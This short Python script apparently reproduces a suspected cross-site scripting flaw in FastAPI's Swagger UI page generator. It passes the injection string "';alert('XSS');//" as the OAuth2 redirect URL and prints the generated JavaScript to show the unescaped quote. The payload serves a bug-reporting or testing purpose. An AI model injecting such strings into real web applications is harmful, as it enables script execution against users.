import sys
sys.path.insert(0, '/home/npc/pbt/agentic-pbt/envs/fastapi_env')

from fastapi.openapi.docs import get_swagger_ui_html

# Test case that demonstrates the XSS vulnerability
malicious_url = "';alert('XSS');//"

html = get_swagger_ui_html(
    openapi_url="/openapi.json",
    title="Test API",
    oauth2_redirect_url=malicious_url
)

html_str = html.body.decode()

# Find and print the line containing oauth2RedirectUrl
start_idx = html_str.find("oauth2RedirectUrl")
if start_idx != -1:
    end_idx = html_str.find("\n", start_idx)
    print("OAuth2 redirect line in generated JavaScript:")
    print(html_str[start_idx:end_idx])
    print("\nThis shows the single quote is not escaped, allowing JavaScript injection.")
else:
    print("oauth2RedirectUrl not found in output")